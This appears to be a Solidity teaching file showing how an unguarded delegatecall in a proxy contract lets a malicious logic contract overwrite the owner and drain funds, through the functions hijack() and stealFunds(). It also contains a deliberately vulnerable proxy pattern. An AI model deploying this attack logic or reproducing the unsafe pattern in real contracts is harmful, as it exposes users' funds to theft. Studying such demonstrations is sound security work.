// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Vulnerable Proxy Contract
contract VulnerableProxy {
    address public implementation;
    address public owner;
    uint256 public value;
    uint256 public balance;

    constructor(address _implementation) payable {
        implementation = _implementation;
        owner = msg.sender;
        balance = msg.value;
    }

    // VULNERABLE: Using delegatecall without proper access control
    fallback() external payable {
        balance += msg.value;
        (bool success, ) = implementation.delegatecall(msg.data);
        require(success, "Delegatecall failed");
    }

    receive() external payable {
        balance += msg.value;
    }

    function upgradeImplementation(address newImplementation) external {
        require(msg.sender == owner, "Not owner");
        implementation = newImplementation;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Safe Logic Contract - Modified to work with proxy pattern
contract SafeLogic {
    // WARNING: Storage layout must match proxy exactly!
    address public implementation; // Slot 0 - matches proxy
    address public owner;          // Slot 1 - matches proxy  
    uint256 public value;          // Slot 2 - matches proxy
    uint256 public balance;        // Slot 3 - matches proxy

    function setValue(uint256 _value) external {
        require(msg.sender == owner, "Not owner"); // Now uses proxy's owner!
        value = _value;
    }

    function withdraw(uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        require(amount <= address(this).balance, "Insufficient balance");
        payable(owner).transfer(amount);
    }
}

// Malicious Logic Contract - Exploits delegatecall
// Malicious Logic Contract - Exploits delegatecall
contract MaliciousLogic {
    // Same storage layout as proxy!
    address public implementation; // Slot 0
    address public owner;          // Slot 1  
    uint256 public value;          // Slot 2
    uint256 public balance;        // Slot 3

    function hijack() external {
        owner = msg.sender; // Overwrites proxy's owner!
    }

    function stealFunds() external {
        require(msg.sender == owner, "Not owner");
        // Transfer all funds from proxy to attacker
        // Since this is delegatecall, address(this) is the proxy address
        uint256 contractBalance = address(this).balance;
        payable(owner).transfer(contractBalance);
    }

    function setImplementation(address newImplementation) external {
        require(msg.sender == owner, "Not owner");
        implementation = newImplementation;
    }
    
    // Helper function to demonstrate the exploit
    function setValueToProveExploit(uint256 _value) external {
        value = _value; // This will modify proxy's value storage
    }
}